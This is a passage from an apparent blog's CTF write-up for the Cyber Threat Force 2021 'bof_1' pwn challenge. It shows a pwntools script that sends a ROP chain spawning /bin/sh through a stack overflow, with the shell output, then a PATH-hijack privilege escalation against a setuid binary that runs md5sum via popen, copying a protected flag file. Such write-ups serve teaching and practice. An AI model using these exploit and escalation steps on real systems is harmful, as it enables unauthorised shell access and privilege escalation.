+context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
+context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">gen_rop&lt;/span>():
+p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> x : pack(&lt;span style="color:#e6db74">&amp;#39;Q&amp;#39;&lt;/span>, x)
+IMAGE_BASE_0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000400000&lt;/span> &lt;span style="color:#75715e"># aae3c9732e164e7d4d0643ec3d3d8bd1f2a571dcb933e57afd11939c43984473&lt;/span>
+rebase_0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> x : p(x &lt;span style="color:#f92672">+&lt;/span> IMAGE_BASE_0)
+rop &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000962f&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040962f: pop r13; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;//bin/sh&amp;#39;&lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001b2d&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401b2d: pop rbx; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e0&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000715c2&lt;/span>) &lt;span style="color:#75715e"># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000962f&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040962f: pop r13; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0x0000000000000000&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001b2d&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401b2d: pop rbx; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000715c2&lt;/span>) &lt;span style="color:#75715e"># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001ece&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401ece: pop rdi; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e0&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000880e&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040880e: pop rsi; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000008ef5b&lt;/span>) &lt;span style="color:#75715e"># 0x000000000048ef5b: pop rdx; pop rbx; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000302c&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040302c: pop rax; ret; &lt;/span>
+rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0x000000000000003b&lt;/span>)
+rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000001ca64&lt;/span>) &lt;span style="color:#75715e"># 0x000000000041ca64: syscall; ret; &lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span> rop
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
+r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
+&lt;span style="color:#66d9ef">else&lt;/span>:
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> r
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+wanted &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x401885&lt;/span>)
+offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;?&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>recvline()
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: gen_rop()}))
+r&lt;span style="color:#f92672">.&lt;/span>recvline()
+r&lt;span style="color:#f92672">.&lt;/span>interactive()
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+main()
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py LOCAL
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
+Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">682309&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
+$ pwd
+/home/vivescere/ctf/bof_1
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And it worked! The flag was in &lt;code>/home/ctf/flag.txt&lt;/code>: &lt;code>CYBERTF{B@sic_R0PChain}&lt;/code>.&lt;/p>
+&lt;h2 id="level-3-privesc">Level 3: PrivEsc&lt;/h2>
+&lt;p>I started looking around the filesystem, and quickly found a SETUID binary: &lt;code>/bin/check&lt;/code>. I didn&amp;rsquo;t have a way to download it using SCP, so I patched the exploit to do it instead:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+wanted &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x401885&lt;/span>)
+offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;?&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>recvline()
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: gen_rop()}))
+r&lt;span style="color:#f92672">.&lt;/span>recvline()
+&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;check&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;cat /bin/check&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;exit&amp;#39;&lt;/span>)
+f&lt;span style="color:#f92672">.&lt;/span>write(r&lt;span style="color:#f92672">.&lt;/span>recvall())
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then decompiled the main function using Ghidra:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
+undefined8 uVar2;
+size_t sVar3;
+&lt;span style="color:#66d9ef">long&lt;/span> lVar4;
+undefined8 &lt;span style="color:#f92672">*&lt;/span>puVar5;
+&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
+byte bVar6;
+undefined8 local_420;
+undefined8 local_418;
+undefined8 local_410;
+undefined8 local_408 [&lt;span style="color:#ae81ff">127&lt;/span>];
+&lt;span style="color:#66d9ef">long&lt;/span> local_10;
+bVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
+setreuid(&lt;span style="color:#ae81ff">0x3e9&lt;/span>,&lt;span style="color:#ae81ff">0x3e9&lt;/span>);
+local_418 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_410 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+lVar4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7e&lt;/span>;
+puVar5 &lt;span style="color:#f92672">=&lt;/span> local_408;
+&lt;span style="color:#66d9ef">while&lt;/span> (lVar4 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+lVar4 &lt;span style="color:#f92672">=&lt;/span> lVar4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;span style="color:#f92672">*&lt;/span>puVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puVar5 &lt;span style="color:#f92672">=&lt;/span> puVar5 &lt;span style="color:#f92672">+&lt;/span> (ulong)bVar6 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+local_420 &lt;span style="color:#f92672">=&lt;/span> popen(&lt;span style="color:#e6db74">&amp;#34;md5sum /home/ctf_cracked/flag.txt | cut -d &lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74"> -f 1&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (local_420 &lt;span style="color:#f92672">==&lt;/span> (FILE &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>) {
+puts(&lt;span style="color:#e6db74">&amp;#34;Command Failed&amp;#34;&lt;/span>);
+uVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+&lt;span style="color:#66d9ef">else&lt;/span> {
+fgets((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#ae81ff">0x400&lt;/span>,local_420);
+sVar3 &lt;span style="color:#f92672">=&lt;/span> strlen((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418);
+&lt;span style="color:#f92672">*&lt;/span>(undefined &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_420 &lt;span style="color:#f92672">+&lt;/span> sVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+iVar1 &lt;span style="color:#f92672">=&lt;/span> strcmp((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#e6db74">&amp;#34;8b098e9d5692641375f8da6d399edf98&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+puts(&lt;span style="color:#e6db74">&amp;#34;All is clear&amp;#34;&lt;/span>);
+}
+&lt;span style="color:#66d9ef">else&lt;/span> {
+puts(&lt;span style="color:#e6db74">&amp;#34;Contact Administrator&amp;#34;&lt;/span>);
+}
+uVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span> (local_10 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>)) {
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+__stack_chk_fail();
+}
+&lt;span style="color:#66d9ef">return&lt;/span> uVar2;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file containing the flag is (of course) not directly readable, but the owner is the same as the binary owner: &lt;code>ctf_cracked&lt;/code>. The program executes a command. We can abuse this by editing the PATH before launching the binary:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cd /tmp
+$ mkdir solution
+$ echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; md5sum
+$ echo &lt;span style="color:#e6db74">&amp;#39;cat /home/ctf_cracked/flag.txt &amp;gt; /tmp/solution/flag.txt&amp;#39;&lt;/span> &amp;gt;&amp;gt; md5sum
+$ PATH&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>pwd&lt;span style="color:#66d9ef">)&lt;/span>:/bin check
+$ cat /tmp/solution/flag.txt
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{B@sicPrivEsc(Anti_Gu3ssing)}&lt;/code>.&lt;/p>
+&lt;h2 id="more">More&lt;/h2>
+&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof1">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item></channel></rss>
